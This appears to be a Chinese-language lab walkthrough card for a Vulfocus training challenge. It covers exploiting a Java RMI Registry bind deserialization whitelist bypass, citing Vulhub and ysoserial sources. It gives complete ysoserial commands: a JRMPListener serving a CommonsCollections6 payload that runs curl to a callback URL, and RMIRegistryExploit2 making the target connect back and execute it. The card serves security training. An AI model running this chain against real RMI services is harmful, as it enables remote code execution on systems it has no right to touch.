# Java RMI Registry Bind Deserialization Bypass 代码执行

> **题库信息：**题名 `java-rmi-registry-bind-deserialization-bypass 代码执行`；镜像 `vulfocus/java-rmi-registry-bind-deserialization-bypass:latest`；内部端口 `1099`；无 CVE。
>
> **一句话链路：**向 RMI Registry 的 `bind` 发送带白名单 RMI 引用的对象，使目标向攻击机的 JRMP Listener 发起反连；Listener 再把 CommonsCollections6 二阶段载荷返回给目标执行。[S1][S2][S3][S4]
>
> **适用边界：**公开同名 Vulhub 复现将环境标为 JDK `<8u232_b09`，但没有证据确认 Vulfocus `latest` 的 JDK、依赖或网络配置与其相同。下列是该 bypass 的公开复现链，不是对 Vulfocus 镜像的验证结论。[S1][S2]

## 操作步骤

1. 启动 Vulfocus 本题实例，记录页面显示的目标地址和外部映射端口。题库给出的 `1099` 是镜像内部端口；连接目标时使用实例页面实际显示的映射端口。[S1]
2. 准备包含 `ysoserial.exploit.JRMPListener` 和 `ysoserial.exploit.RMIRegistryExploit2` 的 ysoserial fork/jar。该 bypass 使用这两个工具分两段完成；普通 ysoserial 包若没有 `RMIRegistryExploit2`，不能直接照抄后续命令。[S1][S3][S4]
3. 在攻击机启动 JRMP Listener。将 `<攻击机可达地址>` 换成目标实例能够访问到的攻击机地址；将回连 URL 换成自己可查看请求的地址。Listener 端口示例为 `8888`：

   ```bash
   java -cp <ysoserial-fork.jar> ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "curl http://<可观察回连的地址>/rmi-bypass-check"
   ```

   该命令在 Listener 上准备 CommonsCollections6 二阶段载荷并等待目标连接；公开复现使用 `curl` 请求作执行回连标记。[S1][S4]
4. 保持 Listener 运行，在另一终端向目标 Registry 发送 bind 请求。四个参数依次是 Registry 地址、Registry 外部映射端口、目标可访问的 Listener 地址、Listener 端口：

   ```bash
   java -cp <ysoserial-fork.jar> ysoserial.exploit.RMIRegistryExploit2 <Vulfocus目标地址> <外部映射端口> <攻击机可达地址> 8888
   ```

   `RMIRegistryExploit2` 会用指向 JRMP Listener 的 `UnicastRef` 构造 `RMIConnectionImpl_Stub`，然后调用 Registry 的 `bind`；这与直接把 CommonsCollections gadget 随 bind 一次性发送的旧链不同。[S2][S3]
5. 查看 JRMP Listener 是否收到目标连接，以及回连服务是否收到 `/rmi-bypass-check` 请求。公开复现提示 Registry 客户端可能收到错误，但命令仍可能已执行；不要只依据 bind 报错判断结果。[S1][S4]

## 本题特有排坑

- **这是两段链，Listener 必须先启动：**`1099`（或 Vulfocus 显示的外部映射端口）是攻击机到 Registry 的连接；`8888` 是目标反连攻击机 JRMP Listener 的端口。`<攻击机可达地址>` 必须从目标容器一侧可达，不能填攻击机的 `127.0.0.1`、`localhost` 或目标自身地址。[S1][S3][S4]
- **确认使用带 `RMIRegistryExploit2` 的 ysoserial fork：**参数顺序为 `<RegistryHost> <RegistryPort> <JRMPListenerHost> <JRMPListenerPort>`。把最后两个参数错写成目标 Registry 地址/端口，或用了只有普通 `RMIRegistryExploit` 的 jar，链路都不匹配。[S1][S3]
- **Registry 返回异常并非唯一判据：**公开复现说明 bind 结束时可能报错；优先看 Listener 的入站连接和执行回连是否出现。[S1]
- **版本和 gadget 依赖仍是前提：**公开同名复现标记 JDK `<8u232_b09`，并以 CommonsCollections6 作为二阶段载荷；Vulfocus 镜像实际 JDK、过滤配置及目标 classpath 未被来源确认。若 Listener 有连接但没有执行回连，不要把“反连成功”当成命令执行已成功，也不要擅自切换到第048题的普通 bind 链。[S1][S2][S4]
- **不要与相邻题目的链路混用：**本卡是“白名单允许的 RMI 引用 → 目标反连 JRMP Listener → Listener 下发二阶段载荷”；不使用第047题的 codebase 类加载，也不使用第048题的直接 CommonsCollections bind payload。[S1][S2][S3]

## 来源

- **[S1] 同名 bypass 环境复现（Vulhub 仓库镜像）：**[Vulhub — Java < JDK8u232_b09 RMI Registry Deserialization Remote Code Execution Bypass](https://git.inmind-lab.com/aaronxu/vulhub/src/commit/63285f61aaf4501a6660be7dfe98c70135c1b89b/java/rmi-registry-bind-deserialization-bypass/README.md?display=rendered) — 对应 bypass 题名；给出 Registry 1099、先启动 `JRMPListener` 再运行 `RMIRegistryExploit2`/`RMIRegistryExploit3` 的命令，并说明 Registry 报错仍可能执行。该资料不能证明 Vulfocus `latest` 的具体构建。
- **[S2] RMI Registry 白名单绕过技术分析：**[浅谈 Java RMI Registry 安全问题](https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/) — 重点参考“攻击 Registry jdk<8u232_b09”及后续修复分析，说明白名单中的 `UnicastRef`、Remote stub/handler 如何让目标建立 JRMP 连接，并指出该反连利用的版本边界；不确认本题镜像版本。
- **[S3] `RMIRegistryExploit2` 源码：**[wh1t3p1g/ysoserial — RMIRegistryExploit2.java](https://github.com/wh1t3p1g/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit2.java) — 支持参数顺序；代码以 Listener host/port 创建 `UnicastRef` 和 `RMIConnectionImpl_Stub`，随后调用 `registry.bind()`。
- **[S4] `JRMPListener` 源码：**[wh1t3p1g/ysoserial — JRMPListener.java](https://github.com/wh1t3p1g/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java) — 支持 Listener 参数格式、载荷构造和目标连接后返回二阶段对象的流程。

来源清单：[`../sources/049_java-rmi-registry-bind-deserialization-bypass/_meta.md`](../sources/049_java-rmi-registry-bind-deserialization-bypass/_meta.md)

